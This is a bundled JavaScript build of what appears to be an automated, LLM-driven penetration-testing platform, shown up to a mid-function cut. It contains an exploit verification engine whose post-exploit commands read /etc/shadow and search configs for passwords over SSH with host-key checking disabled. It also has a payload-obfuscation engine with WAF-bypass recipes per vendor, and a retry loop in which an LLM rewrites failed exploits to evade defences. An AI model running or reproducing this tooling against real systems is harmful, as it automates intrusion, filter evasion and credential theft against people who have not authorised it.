import {
  executeExploit,
  init_exploit_sandbox
} from "./chunk-Y2F2HBFB.js";
import {
  detectWaf,
  init_waf_detector
} from "./chunk-XWTSM22M.js";
import {
  executeRawCommand,
  init_scan_server_executor
} from "./chunk-NCT2XXC3.js";
import {
  __esm
} from "./chunk-KFQGP6VL.js";

// server/lib/exploit-verification-engine.ts
async function verifyExploitSuccess(execResult, targetHost, targetPort, config = {}) {
  const cfg = { ...DEFAULT_CONFIG, ...config };
  const startTime = Date.now();
  const verificationCommands = [];
  let canaryResults;
  let llmClassification;
  const fpCheck = checkFalsePositivePatterns(execResult);
  if (fpCheck.isFalsePositive) {
    return {
      exploitId: execResult.exploitId,
      status: "false_positive",
      accessLevel: "none",
      confidence: fpCheck.confidence,
      explanation: fpCheck.explanation,
      verificationCommands: [],
      durationMs: Date.now() - startTime,
      verifiedAt: Date.now()
    };
  }
  if (execResult.status === "timeout" || execResult.status === "blocked") {
    return {
      exploitId: execResult.exploitId,
      status: "infrastructure_error",
      accessLevel: "none",
      confidence: 90,
      explanation: `Exploit ${execResult.status}: ${execResult.stderr?.slice(0, 200) || "No details"}`,
      verificationCommands: [],
      durationMs: Date.now() - startTime,
      verifiedAt: Date.now()
    };
  }
  const accessType = inferAccessType(execResult);
  if (cfg.enableCommandVerification && accessType !== "none") {
    const commands = selectVerificationCommands(accessType, cfg.maxVerificationCommands);
    for (const cmd of commands) {
      try {
        const verifyScript = buildVerificationScript(
          execResult,
          cmd.command,
          targetHost,
          targetPort
        );
        const result = await executeRawCommand(verifyScript, cfg.verificationTimeoutSec);
        const pattern = new RegExp(cmd.expectedPattern, "i");
        const matched = pattern.test(result.stdout);
        verificationCommands.push({
          command: cmd.command,
          expectedPattern: cmd.expectedPattern,
          actualOutput: result.stdout.slice(0, 1e3),
          matched,
          proves: cmd.proves
        });
      } catch (err) {
        verificationCommands.push({
          command: cmd.command,
          expectedPattern: cmd.expectedPattern,
          actualOutput: `Error: ${err.message}`,
          matched: false,
          proves: cmd.proves
        });
      }
    }
  }
  if (cfg.enableLLMClassification) {
    try {
      llmClassification = await classifyOutputWithLLM(execResult, verificationCommands);
    } catch (err) {
      console.warn(`[ExploitVerification] LLM classification failed: ${err.message}`);
    }
  }
  const verdict = synthesizeVerdict(execResult, verificationCommands, llmClassification, canaryResults);
  return {
    exploitId: execResult.exploitId,
    ...verdict,
    verificationCommands,
    llmClassification,
    canaryResults,
    durationMs: Date.now() - startTime,
    verifiedAt: Date.now()
  };
}
function checkFalsePositivePatterns(execResult) {
  const output = `${execResult.stdout}
${execResult.stderr}`.trim();
  if (!output && execResult.exitCode === 0) {
    return {
      isFalsePositive: true,
      confidence: 70,
      explanation: "Empty output with exit code 0 \u2014 no evidence of exploitation"
    };
  }
  for (const pattern of TRUE_POSITIVE_PATTERNS) {
    if (pattern.test(output)) {
      return { isFalsePositive: false, confidence: 0, explanation: "" };
    }
  }
  let fpScore = 0;
  const fpReasons = [];
  for (const pattern of FALSE_POSITIVE_PATTERNS) {
    if (pattern.test(output)) {
      fpScore += 15;
      fpReasons.push(pattern.source);
    }
  }
  const lines = output.split("\n").filter((l) => l.trim());
  const selfReferentialLines = lines.filter(
    (l) => /^\[.*\]|^#|^print|^echo|^DEBUG|^INFO|^WARNING/i.test(l.trim())
  );
  if (selfReferentialLines.length > lines.length * 0.7 && lines.length > 3) {
    fpScore += 30;
    fpReasons.push("Output is mostly script debug/info messages, not target response");
  }
  const confidenceOnlyPattern = /^.*confidence.*:?\s*\d+.*$/im;
  const hasOnlyConfidence = lines.every(
    (l) => !l.trim() || confidenceOnlyPattern.test(l) || /^\[.*\]/.test(l)
  );
  if (hasOnlyConfidence && lines.length > 0) {
    fpScore += 40;
    fpReasons.push("Output contains only confidence scores \u2014 no actual exploit evidence");
  }
  if (fpScore >= 40) {
    return {
      isFalsePositive: true,
      confidence: Math.min(95, fpScore),
      explanation: `False positive detected: ${fpReasons.join("; ")}`
    };
  }
  return { isFalsePositive: false, confidence: 0, explanation: "" };
}
function inferAccessType(execResult) {
  const evidence = execResult.evidence;
  if (!evidence) return "none";
  switch (evidence.achievedAccess) {
    case "shell":
      return "os_command";
    case "rce":
      return "os_command";
    case "file_access":
      return "file_read";
    case "credential":
      return "credential";
    case "info_leak":
      return "web_shell";
    default:
      return "none";
  }
}
function selectVerificationCommands(accessType, maxCommands) {
  const commands = VERIFICATION_COMMANDS[accessType] || VERIFICATION_COMMANDS.os_command;
  return commands.slice(0, maxCommands);
}
function buildVerificationScript(execResult, verifyCommand, targetHost, targetPort) {
  const port = targetPort || 22;
  const timeout = 10;
  if (execResult.evidence?.achievedAccess === "info_leak" || execResult.stdout?.includes("http")) {
    return `timeout ${timeout} curl -s "http://${targetHost}:${targetPort || 80}/" 2>&1 | head -20`;
  }
  return `timeout ${timeout} ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 ${targetHost} "${verifyCommand}" 2>&1 || echo "VERIFY_CMD_FAILED"`;
}
async function classifyOutputWithLLM(execResult, verificationCommands) {
  const { invokeLLM } = await import("./llm-YH2E5SAK.js");
  const verificationSummary = verificationCommands.length > 0 ? `

Post-exploit verification results:
${verificationCommands.map(
    (v) => `- Command: ${v.command}
  Expected: ${v.expectedPattern}
  Got: ${v.actualOutput.slice(0, 200)}
  Matched: ${v.matched}`
  ).join("\n")}` : "";
  const response = await invokeLLM({
    _caller: "exploit-verification-engine:classifyOutput",
    messages: [
      {
        role: "system",
        content: `You are a senior penetration tester analyzing exploit execution output. Your job is to determine whether the exploit ACTUALLY succeeded or if the output is misleading.

CRITICAL RULES:
1. Non-empty output does NOT mean success. Scripts can produce verbose output while completely failing.
2. Confidence scores, probability percentages, and likelihood assessments in the output are NOT evidence of exploitation.
3. Python tracebacks, ImportErrors, ConnectionRefused, and timeout messages indicate FAILURE.
4. Look for concrete evidence: command output (uid=, whoami results), file contents (/etc/passwd), database rows, session tokens, or error messages FROM THE TARGET (not from the script).
5. If the output is ambiguous, classify as "unverified" \u2014 never upgrade to "confirmed_success" without definitive proof.
6. WAF blocks (403, 406, "Access Denied") indicate confirmed_failure, not infrastructure_error.`
      },
      {
        role: "user",
        content: `Analyze this exploit execution output and classify the result.

Exploit ID: ${execResult.exploitId}
Language: ${execResult.language}
Exit Code: ${execResult.exitCode}
Status: ${execResult.status}
Duration: ${execResult.durationMs}ms

STDOUT (first 3000 chars):
${execResult.stdout?.slice(0, 3e3) || "(empty)"}

STDERR (first 1000 chars):
${execResult.stderr?.slice(0, 1e3) || "(empty)"}${verificationSummary}

Classify this output. Be conservative \u2014 false positives are worse than false negatives.`
      }
    ],
    response_format: EXPLOIT_CLASSIFICATION_SCHEMA
  });
  const parsed = JSON.parse(response.choices[0].message.content || "{}");
  return {
    status: parsed.status,
    accessLevel: parsed.access_level,
    confidence: parsed.confidence,
    reasoning: parsed.reasoning,
    falsePositiveIndicators: parsed.false_positive_indicators,
    truePositiveIndicators: parsed.true_positive_indicators,
    recommendedNextSteps: parsed.recommended_next_steps
  };
}
function synthesizeVerdict(execResult, verificationCommands, llmClassification, canaryResults) {
  let status = "unverified";
  let accessLevel = "none";
  let confidence = 0;
  const explanations = [];
  const matchedCommands = verificationCommands.filter((v) => v.matched);
  const totalCommands = verificationCommands.length;
  if (totalCommands > 0) {
    const matchRatio = matchedCommands.length / totalCommands;
    if (matchRatio >= 0.6) {
      status = "confirmed_success";
      confidence += 40;
      explanations.push(`${matchedCommands.length}/${totalCommands} verification commands matched`);
    } else if (matchRatio > 0) {
      status = "probable_success";
      confidence += 20;
      explanations.push(`${matchedCommands.length}/${totalCommands} verification commands matched (partial)`);
    } else {
      status = "confirmed_failure";
      confidence += 30;
      explanations.push("No verification commands matched \u2014 exploit likely failed");
    }
  }
  if (llmClassification) {
    if (llmClassification.status === "confirmed_success" && status !== "confirmed_failure") {
      if (status !== "confirmed_success") status = "probable_success";
      confidence += Math.min(30, llmClassification.confidence * 0.3);
      explanations.push(`LLM: ${llmClassification.reasoning.slice(0, 100)}`);
    } else if (llmClassification.status === "false_positive") {
      if (status !== "confirmed_success") {
        status = "false_positive";
        confidence = Math.max(confidence, llmClassification.confidence);
      }
      explanations.push(`LLM detected false positive: ${llmClassification.reasoning.slice(0, 100)}`);
    } else if (llmClassification.status === "confirmed_failure") {
      if (status !== "confirmed_success") {
        status = "confirmed_failure";
        confidence += 25;
      }
      explanations.push(`LLM: ${llmClassification.reasoning.slice(0, 100)}`);
    }
    if (llmClassification.accessLevel !== "none") {
      accessLevel = llmClassification.accessLevel;
    }
  }
  if (canaryResults?.length) {
    const received = canaryResults.filter((c) => c.callbackReceived);
    if (received.length > 0) {
      status = "confirmed_success";
      confidence += 35;
      explanations.push(`${received.length} canary callbacks received \u2014 blind exploitation confirmed`);
    }
  }
  const output = `${execResult.stdout}
${execResult.stderr}`;
  for (const pattern of TRUE_POSITIVE_PATTERNS) {
    if (pattern.test(output)) {
      if (status === "unverified") status = "probable_success";
      confidence += 10;
      explanations.push(`True positive pattern matched: ${pattern.source.slice(0, 50)}`);
      break;
    }
  }
  if (accessLevel === "none" && execResult.evidence) {
    switch (execResult.evidence.achievedAccess) {
      case "shell":
        accessLevel = "user_shell";
        break;
      case "rce":
        accessLevel = "command_execution";
        break;
      case "file_access":
        accessLevel = "file_read";
        break;
      case "credential":
        accessLevel = "credential_access";
        break;
      case "info_leak":
        accessLevel = "info_disclosure";
        break;
    }
  }
  confidence = Math.min(100, Math.max(0, confidence));
  return {
    status,
    accessLevel,
    confidence,
    explanation: explanations.join(" | ")
  };
}
var DEFAULT_CONFIG, VERIFICATION_COMMANDS, FALSE_POSITIVE_PATTERNS, TRUE_POSITIVE_PATTERNS, EXPLOIT_CLASSIFICATION_SCHEMA;
var init_exploit_verification_engine = __esm({
  "server/lib/exploit-verification-engine.ts"() {
    "use strict";
    init_scan_server_executor();
    DEFAULT_CONFIG = {
      enableCommandVerification: true,
      enableLLMClassification: true,
      enableCanaryValidation: true,
      verificationTimeoutSec: 15,
      maxVerificationCommands: 5
    };
    VERIFICATION_COMMANDS = {
      // OS-level command execution
      os_command: [
        { command: "id", expectedPattern: "uid=", proves: "OS command execution confirmed (id output)" },
        { command: "whoami", expectedPattern: ".+", proves: "OS command execution confirmed (whoami output)" },
        { command: "hostname", expectedPattern: ".+", proves: "OS command execution confirmed (hostname output)" },
        { command: "uname -a", expectedPattern: "Linux|Darwin|Windows", proves: "OS identification confirmed" },
        { command: "cat /etc/hostname 2>/dev/null || hostname", expectedPattern: ".+", proves: "Hostname file read or command execution" }
      ],
      // File read verification
      file_read: [
        { command: "cat /etc/passwd | head -3", expectedPattern: "root:", proves: "File read access confirmed (/etc/passwd readable)" },
        { command: "ls -la /etc/ | head -5", expectedPattern: "total", proves: "Directory listing confirmed" },
        { command: "cat /etc/os-release 2>/dev/null | head -3", expectedPattern: "NAME=", proves: "OS release file readable" }
      ],
      // Database access verification
      database: [
        { command: "SELECT version()", expectedPattern: "MySQL|MariaDB|PostgreSQL|Microsoft SQL", proves: "Database query execution confirmed" },
        { command: "SELECT current_user()", expectedPattern: ".+@", proves: "Database user context confirmed" },
        { command: "SHOW DATABASES", expectedPattern: "information_schema", proves: "Database enumeration confirmed" }
      ],
      // Web shell verification
      web_shell: [
        { command: 'echo "SCANFORGE_VERIFY_$(date +%s)"', expectedPattern: "SCANFORGE_VERIFY_", proves: "Web shell command execution confirmed" },
        { command: "pwd", expectedPattern: "/", proves: "Working directory readable via web shell" }
      ],
      // Credential access verification
      credential: [
        { command: "cat /etc/shadow 2>/dev/null | head -1", expectedPattern: "root:", proves: "Shadow file readable \u2014 credential access confirmed" },
        { command: 'find / -name "*.conf" -exec grep -l "password" {} \\; 2>/dev/null | head -3', expectedPattern: ".conf", proves: "Configuration files with credentials found" }
      ],
      // Root/privilege verification
      root: [
        { command: "id", expectedPattern: "uid=0", proves: "Root access confirmed (uid=0)" },
        { command: "cat /etc/shadow | head -1", expectedPattern: ":", proves: "Shadow file readable \u2014 root or equivalent access" },
        { command: "iptables -L 2>/dev/null | head -3", expectedPattern: "Chain", proves: "Firewall rules readable \u2014 elevated privileges confirmed" }
      ]
    };
    FALSE_POSITIVE_PATTERNS = [
      // Error messages that look like success
      /connection refused/i,
      /connection timed out/i,
      /connection reset/i,
      /no route to host/i,
      /name or service not known/i,
      /ssl.*error/i,
      /certificate.*error/i,
      // HTTP error responses
      /403 forbidden/i,
      /404 not found/i,
      /405 method not allowed/i,
      /500 internal server error/i,
      /502 bad gateway/i,
      /503 service unavailable/i,
      // WAF/IDS blocks
      /access denied/i,
      /request blocked/i,
      /waf.*block/i,
      /rate limit/i,
      /captcha/i,
      // Script errors (not target errors)
      /traceback.*most recent call/i,
      /syntaxerror/i,
      /importerror/i,
      /modulenotfounderror/i,
      /nameerror/i,
      /typeerror.*argument/i,
      /filenotfounderror/i,
      // Confidence scores being treated as evidence (Vianova bug)
      /confidence.*score.*\d+/i,
      /probability.*\d+%/i,
      /likelihood.*\d+/i
    ];
    TRUE_POSITIVE_PATTERNS = [
      /uid=\d+\(.*\)\s+gid=\d+/,
      // id command output
      /root:x:0:0/,
      // /etc/passwd root entry
      /\$\d+\$[a-zA-Z0-9./]+\$/,
      // Password hash
      /BEGIN (RSA|DSA|EC|OPENSSH) PRIVATE KEY/,
      // Private key
      /mysql>|postgres[=#]|mssql>/i,
      // Database prompt
      /meterpreter\s*>/i,
      // Meterpreter session
      /\[shell\]\s*$/,
      // Shell prompt
      /www-data|apache|nginx|httpd/,
      // Web service user
      /AWS_ACCESS_KEY_ID|AWS_SECRET/i,
      // Cloud credentials
      /eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/
      // JWT token
    ];
    EXPLOIT_CLASSIFICATION_SCHEMA = {
      type: "json_schema",
      json_schema: {
        name: "exploit_output_classification",
        strict: true,
        schema: {
          type: "object",
          properties: {
            status: {
              type: "string",
              enum: ["confirmed_success", "probable_success", "unverified", "confirmed_failure", "infrastructure_error", "false_positive"]
            },
            access_level: {
              type: "string",
              enum: ["none", "info_disclosure", "file_read", "file_write", "credential_access", "command_execution", "user_shell", "root_shell", "database_access", "service_account"]
            },
            confidence: { type: "number" },
            reasoning: { type: "string" },
            false_positive_indicators: { type: "array", items: { type: "string" } },
            true_positive_indicators: { type: "array", items: { type: "string" } },
            recommended_next_steps: { type: "array", items: { type: "string" } }
          },
          required: ["status", "access_level", "confidence", "reasoning", "false_positive_indicators", "true_positive_indicators", "recommended_next_steps"],
          additionalProperties: false
        }
      }
    };
  }
});

// server/lib/payload-encoding-engine.ts
function urlEncode(s) {
  return encodeURIComponent(s);
}
function urlDoubleEncode(s) {
  return encodeURIComponent(encodeURIComponent(s));
}
function urlTripleEncode(s) {
  return encodeURIComponent(encodeURIComponent(encodeURIComponent(s)));
}
function unicodeUtf8Encode(s) {
  return s.split("").map((c) => {
    const code = c.charCodeAt(0);
    if (code < 128 && /[a-zA-Z<>'"/\\]/.test(c)) {
      return `%c0%${(code + 128).toString(16)}`;
    }
    return c;
  }).join("");
}
function unicodeUtf16Encode(s) {
  return s.split("").map((c) => {
    const code = c.charCodeAt(0);
    if (/[a-zA-Z<>'"/\\]/.test(c)) {
      return `%u00${code.toString(16).padStart(2, "0")}`;
    }
    return c;
  }).join("");
}
function htmlDecimalEncode(s) {
  return s.split("").map((c) => {
    if (/[a-zA-Z<>'"/\\=()]/.test(c)) {
      return `&#${c.charCodeAt(0)};`;
    }
    return c;
  }).join("");
}
function htmlHexEncode(s) {
  return s.split("").map((c) => {
    if (/[a-zA-Z<>'"/\\=()]/.test(c)) {
      return `&#x${c.charCodeAt(0).toString(16)};`;
    }
    return c;
  }).join("");
}
function nullByteInject(s) {
  return s.replace(/([<>'"/\\])/g, "%00$1");
}
function caseAlternate(s) {
  const keywords = [
    "SELECT",
    "UNION",
    "FROM",
    "WHERE",
    "AND",
    "OR",
    "INSERT",
    "UPDATE",
    "DELETE",
    "DROP",
    "SCRIPT",
    "ALERT",
    "ONERROR",
    "ONLOAD",
    "IMG",
    "SRC",
    "EVAL",
    "EXEC",
    "SLEEP",
    "BENCHMARK",
    "CONCAT",
    "GROUP_CONCAT",
    "INFORMATION_SCHEMA",
    "TABLE_NAME",
    "COLUMN_NAME"
  ];
  let result = s;
  for (const kw of keywords) {
    const regex = new RegExp(`\\b${kw}\\b`, "gi");
    result = result.replace(regex, (match) => {
      return match.split("").map((c, i) => i % 2 === 0 ? c.toLowerCase() : c.toUpperCase()).join("");
    });
  }
  return result;
}
function commentInsertionSql(s) {
  const keywords = [
    "SELECT",
    "UNION",
    "FROM",
    "WHERE",
    "AND",
    "OR",
    "INSERT",
    "UPDATE",
    "DELETE",
    "SLEEP",
    "BENCHMARK",
    "CONCAT",
    "GROUP_CONCAT"
  ];
  let result = s;
  for (const kw of keywords) {
    const regex = new RegExp(`\\b${kw}\\b`, "gi");
    result = result.replace(regex, (match) => {
      const mid = Math.floor(match.length / 2);
      return `${match.slice(0, mid)}/**/` + match.slice(mid);
    });
  }
  return result;
}
function commentInsertionJs(s) {
  return s.replace(/javascript:/gi, "java	script:").replace(/alert/gi, "al	ert").replace(/eval/gi, "ev	al").replace(/document/gi, "docu	ment");
}
function whitespaceSubstitute(s) {
  const alternatives = ["	", "\n", "\r", "\v", "\f", "/**/"];
  let idx = 0;
  return s.replace(/ /g, () => {
    const alt = alternatives[idx % alternatives.length];
    idx++;
    return alt;
  });
}
function hexEncode(s) {
  return "0x" + Buffer.from(s).toString("hex");
}
function charFunctionEncode(s) {
  const chars = s.split("").map((c) => c.charCodeAt(0));
  return `CHAR(${chars.join(",")})`;
}
function concatSplit(s) {
  if (s.length < 4) return s;
  const mid = Math.floor(s.length / 2);
  return `CONCAT('${s.slice(0, mid)}','${s.slice(mid)}')`;
}
function encodePayload(payload, technique, vulnClass = "generic") {
  const encoder = ENCODERS[technique];
  if (!encoder) {
    return {
      original: payload,
      encoded: payload,
      technique: "none",
      vulnClass,
      description: `Unknown encoding technique: ${technique}`,
      depth: 0
    };
  }
  return {
    original: payload,
    encoded: encoder(payload),
    technique,
    vulnClass,
    description: `Encoded with ${technique}`,
    depth: 1
  };
}
function generateWafContextForLLM(wafResult, vulnClass) {
  if (!wafResult?.detected) {
    return "No WAF detected. Standard payloads should work.";
  }
  const vendor = wafResult.vendor || "Unknown";
  const strategies = WAF_BYPASS_STRATEGIES[vendor] || WAF_BYPASS_STRATEGIES["Unknown WAF"];
  const hints = wafResult.evasionHints || [];
  return `
WAF DETECTED: ${vendor} (confidence: ${wafResult.confidence})
Evidence: ${wafResult.evidence.join("; ")}

REQUIRED ENCODING STRATEGIES (in order of effectiveness for ${vendor}):
${strategies.map((s, i) => `${i + 1}. ${s}`).join("\n")}

EVASION HINTS:
${hints.map((h) => `- ${h}`).join("\n")}

CRITICAL INSTRUCTIONS:
- DO NOT send raw payloads \u2014 they WILL be blocked
- Apply at least one encoding technique from the list above
- For SQL injection: use inline comments (/**/), case alternation, and whitespace substitution
- For XSS: use HTML entity encoding and Unicode normalization
- For command injection: use URL double-encoding and null bytes
- Test with the simplest bypass first, then escalate
- Include a fallback payload using a different encoding if the first fails
${vulnClass ? `
Vulnerability class: ${vulnClass} \u2014 use class-specific bypass techniques` : ""}
`;
}
function selectEvasionStrategy(detectedWaf, vulnClass) {
  const wafLower = (detectedWaf || "").toLowerCase();
  const vc = vulnClass || "generic";
  const wafTechniques = {
    cloudflare: ["url_double", "unicode", "case_swap", "comment_insert"],
    akamai: ["hex", "url_double", "whitespace_vary", "case_swap"],
    imperva: ["unicode", "url_double", "comment_insert", "null_byte"],
    modsecurity: ["url_double", "case_swap", "hex", "comment_insert"],
    f5: ["unicode", "hex", "url_double", "whitespace_vary"],
    aws: ["url_double", "unicode", "case_swap", "comment_insert"]
  };
  const matchedWaf = Object.keys(wafTechniques).find((w) => wafLower.includes(w));
  const techniques = matchedWaf ? wafTechniques[matchedWaf] : VULN_CLASS_ENCODINGS[vc] || ["url_double", "case_swap"];
  return {
    name: matchedWaf ? `${matchedWaf}-evasion` : `generic-${vc}-evasion`,
    techniques: techniques.slice(0, 4),
    wafVendor: detectedWaf,
    vulnClass: vc
  };
}
function applyWafEvasion(code, strategy) {
  try {
    let encoded = code;
    const applied = [];
    for (const technique of strategy.techniques) {
      const result = encodePayload(encoded, technique);
      if (result.encoded !== encoded) {
        encoded = result.encoded;
        applied.push(technique);
      }
    }
    return { success: true, encodedPayload: encoded, techniquesApplied: applied };
  } catch (err) {
    return { success: false, encodedPayload: code, techniquesApplied: [] };
  }
}
var ENCODERS, WAF_BYPASS_STRATEGIES, VULN_CLASS_ENCODINGS;
var init_payload_encoding_engine = __esm({
  "server/lib/payload-encoding-engine.ts"() {
    "use strict";
    init_waf_detector();
    ENCODERS = {
      url_single: urlEncode,
      url_double: urlDoubleEncode,
      url_triple: urlTripleEncode,
      unicode_utf8: unicodeUtf8Encode,
      unicode_utf16: unicodeUtf16Encode,
      html_decimal: htmlDecimalEncode,
      html_hex: htmlHexEncode,
      null_byte: nullByteInject,
      case_alternation: caseAlternate,
      comment_insertion_sql: commentInsertionSql,
      comment_insertion_js: commentInsertionJs,
      whitespace_substitution: whitespaceSubstitute,
      hex_encoding: hexEncode,
      base64_inline: (s) => Buffer.from(s).toString("base64"),
      concat_splitting: concatSplit,
      char_function: charFunctionEncode,
      http_param_pollution: (s) => s,
      // HPP is applied at the request level, not payload level
      none: (s) => s
    };
    WAF_BYPASS_STRATEGIES = {
      Cloudflare: [
        "case_alternation",
        "comment_insertion_sql",
        "unicode_utf8",
        "url_double",
        "whitespace_substitution",
        "hex_encoding"
      ],
      "AWS WAF": [
        "url_double",
        "unicode_utf16",
        "comment_insertion_sql",
        "case_alternation",
        "null_byte",
        "whitespace_substitution"
      ],
      Akamai: [
        "unicode_utf8",
        "url_triple",
        "comment_insertion_sql",
        "whitespace_substitution",
        "case_alternation",
        "hex_encoding"
      ],
      "Imperva/Incapsula": [
        "url_double",
        "unicode_utf8",
        "comment_insertion_sql",
        "case_alternation",
        "null_byte",
        "concat_splitting"
      ],
      "F5 BIG-IP ASM": [
        "http_param_pollution",
        "unicode_utf8",
        "comment_insertion_sql",
        "url_double",
        "case_alternation",
        "whitespace_substitution"
      ],
      ModSecurity: [
        "unicode_utf8",
        "comment_insertion_sql",
        "case_alternation",
        "url_double",
        "whitespace_substitution",
        "null_byte"
      ],
      Sucuri: [
        "url_double",
        "case_alternation",
        "comment_insertion_sql",
        "unicode_utf8",
        "whitespace_substitution",
        "hex_encoding"
      ],
      "Fortinet FortiWeb": [
        "comment_insertion_sql",
        "case_alternation",
        "url_double",
        "unicode_utf8",
        "whitespace_substitution",
        "null_byte"
      ],
      // Generic/unknown WAF
      "Unknown WAF": [
        "url_double",
        "case_alternation",
        "comment_insertion_sql",
        "unicode_utf8",
        "whitespace_substitution",
        "url_triple"
      ]
    };
    VULN_CLASS_ENCODINGS = {
      sqli: ["comment_insertion_sql", "case_alternation", "whitespace_substitution", "hex_encoding", "char_function", "concat_splitting"],
      xss: ["html_decimal", "html_hex", "unicode_utf8", "url_double", "comment_insertion_js", "case_alternation"],
      cmdi: ["url_double", "null_byte", "whitespace_substitution", "hex_encoding", "unicode_utf8", "case_alternation"],
      ssrf: ["url_double", "url_triple", "unicode_utf8", "null_byte", "case_alternation", "hex_encoding"],
      ssti: ["url_double", "unicode_utf8", "html_hex", "url_triple", "case_alternation", "whitespace_substitution"],
      lfi: ["url_double", "url_triple", "null_byte", "unicode_utf8", "whitespace_substitution", "hex_encoding"],
      xxe: ["html_decimal", "html_hex", "unicode_utf8", "url_double", "case_alternation", "whitespace_substitution"],
      generic: ["url_double", "case_alternation", "unicode_utf8", "comment_insertion_sql", "whitespace_substitution", "hex_encoding"]
    };
  }
});

// server/lib/iterative-exploit-loop.ts
async function executeWithIterativeRetry(engagementId, initialRequest, config = {}) {
  const cfg = { ...DEFAULT_CONFIG2, ...config };
  const startTime = Date.now();
  const attempts = [];
  let bestAttempt;
  let wafDetection;
  let currentRequest = { ...initialRequest };
  if (cfg.enableWafAdaptation && cfg.targetHost) {
    try {
      const targetUrl = `http://${cfg.targetHost}:${cfg.targetPort || 80}`;
      wafDetection = await detectWaf(targetUrl);
      if (wafDetection.detected) {
        console.log(`[IterativeLoop] WAF detected: ${wafDetection.vendor}. Adapting payloads.`);
      }
    } catch (err) {
      console.warn(`[IterativeLoop] WAF detection failed: ${err.message}`);
    }
  }
  for (let attempt = 1; attempt <= cfg.maxAttempts; attempt++) {
    const attemptStart = Date.now();
    const adjustments = [];
    console.log(`[IterativeLoop] Attempt ${attempt}/${cfg.maxAttempts} for exploit ${currentRequest.exploitId}`);
    let execResult;
    try {
      execResult = await executeExploit(engagementId, currentRequest);
    } catch (err) {
      console.error(`[IterativeLoop] Execution error on attempt ${attempt}: ${err.message}`);
      attempts.push({
        attemptNumber: attempt,
        exploitResult: {
          exploitId: currentRequest.exploitId,
          status: "error",
          exitCode: -1,
          stdout: "",
          stderr: err.message,
          durationMs: Date.now() - attemptStart,
          executedAt: (/* @__PURE__ */ new Date()).toISOString(),
          language: currentRequest.language,
          dryRun: currentRequest.dryRun || false,
          sandboxInfo: { memoryLimitMb: 256, cpuTimeLimitSec: 30, timeoutSec: 60, networkRestricted: false }
        },
        adjustments: ["Execution failed with exception"],
        timestamp: Date.now(),
        durationMs: Date.now() - attemptStart
      });
      continue;
    }
    let verification;
    if (cfg.enableVerification && cfg.targetHost) {
      try {
        verification = await verifyExploitSuccess(
          execResult,
          cfg.targetHost,
          cfg.targetPort
        );
      } catch (err) {
        console.warn(`[IterativeLoop] Verification failed: ${err.message}`);
      }
    }
    let errorAnalysis;
    const isSuccess = verification ? ["confirmed_success", "probable_success"].includes(verification.status) : execResult.status === "success" && execResult.exitCode === 0;
    if (!isSuccess && cfg.enableLLMErrorAnalysis && attempt < cfg.maxAttempts) {
      try {
        errorAnalysis = await analyzeExploitError(execResult, verification, attempts, wafDetection);
        adjustments.push(...errorAnalysis.suggestedFixes || []);
        if (errorAnalysis.shouldRetry) {
          const correctedCode = await generateCorrectedExploit(
            currentRequest,
            execResult,
            errorAnalysis,
            wafDetection,
            cfg.vulnClass
          );
          if (correctedCode) {
            currentRequest = { ...currentRequest, code: correctedCode };
            adjustments.push("LLM generated corrected exploit code");
          }
        }
      } catch (err) {
        console.warn(`[IterativeLoop] Error analysis failed: ${err.message}`);
      }
    }
    const attemptRecord = {
      attemptNumber: attempt,
      exploitResult: execResult,
      verification,
      errorAnalysis,
      adjustments,
      timestamp: Date.now(),
      durationMs: Date.now() - attemptStart
    };
    attempts.push(attemptRecord);
    if (!bestAttempt || isBetterResult(attemptRecord, bestAttempt)) {
      bestAttempt = attemptRecord;
    }
    if (isSuccess && cfg.stopOnSuccess) {
      console.log(`[IterativeLoop] Exploit succeeded on attempt ${attempt}`);
      break;
    }
    if (errorAnalysis && !errorAnalysis.shouldRetry) {
      console.log(`[IterativeLoop] Error analysis recommends stopping: ${errorAnalysis.rootCause}`);
      break;
    }
    if (attempt < cfg.maxAttempts) {
      await new Promise((r) => setTimeout(r, cfg.attemptDelayMs));
    }
  }
  const totalDurationMs = Date.now() - startTime;
  const succeeded = bestAttempt?.verification ? ["confirmed_success", "probable_success"].includes(bestAttempt.verification.status) : bestAttempt?.exploitResult.status === "success";
  return {
    succeeded: !!succeeded,
    totalAttempts: attempts.length,
    bestResult: bestAttempt,
    attempts,
    wafDetection,
    totalDurationMs,
    summary: buildSummary(attempts, succeeded || false, totalDurationMs)
  };
}
async function analyzeExploitError(execResult, verification, previousAttempts, wafDetection) {
  const { invokeLLM } = await import("./llm-YH2E5SAK.js");
  const previousContext = previousAttempts.length > 0 ? `

Previous attempts:
${previousAttempts.map(
    (a) => `Attempt ${a.attemptNumber}: status=${a.exploitResult.status}, exit=${a.exploitResult.exitCode}, adjustments=[${a.adjustments.join(", ")}]`
  ).join("\n")}` : "";
  const wafContext = wafDetection?.detected ? `

WAF detected: ${wafDetection.vendor} (${wafDetection.confidence} confidence)` : "";
  const response = await invokeLLM({
    _caller: "iterative-exploit-loop:analyzeFailure",
    messages: [
      {
        role: "system",
        content: `You are a senior penetration tester analyzing why an exploit attempt failed. Your job is to identify the root cause and suggest specific, actionable fixes for the next attempt.

Focus on:
1. Whether the error is in the exploit script itself (syntax, logic, missing dependencies)
2. Whether the target blocked the attempt (WAF, IDS, rate limiting)
3. Whether the target is patched against this vulnerability
4. Whether the connection/infrastructure failed (timeout, DNS, routing)

Be specific about fixes \u2014 don't say "fix the code", say exactly what to change.`
      },
      {
        role: "user",
        content: `Analyze this failed exploit attempt:

Exit Code: ${execResult.exitCode}
Status: ${execResult.status}
Language: ${execResult.language}

STDOUT (last 2000 chars):
${execResult.stdout?.slice(-2e3) || "(empty)"}

STDERR (last 1000 chars):
${execResult.stderr?.slice(-1e3) || "(empty)"}

Verification: ${verification ? `${verification.status} (confidence: ${verification.confidence})` : "not performed"}
${wafContext}${previousContext}

What went wrong and how should the next attempt be adjusted?`
      }
    ],
    response_format: ERROR_ANALYSIS_SCHEMA
  });
  const parsed = JSON.parse(response.choices[0].message.content || "{}");
  return {
    errorType: parsed.error_type,
    rootCause: parsed.root_cause,
    suggestedFixes: parsed.suggested_fixes,
    payloadAdjustments: parsed.payload_adjustments,
    shouldRetry: parsed.should_retry,
    confidence: parsed.confidence
  };
}
async function generateCorrectedExploit(originalRequest, failedResult, errorAnalysis, wafDetection, vulnClass = "generic") {
  const { invokeLLM } = await import("./llm-YH2E5SAK.js");
  const wafContext = wafDetection?.detected ? generateWafContextForLLM(wafDetection, vulnClass) : "";
  try {
    const response = await invokeLLM({
      _caller: "iterative-exploit-loop:generateCorrectedExploit",
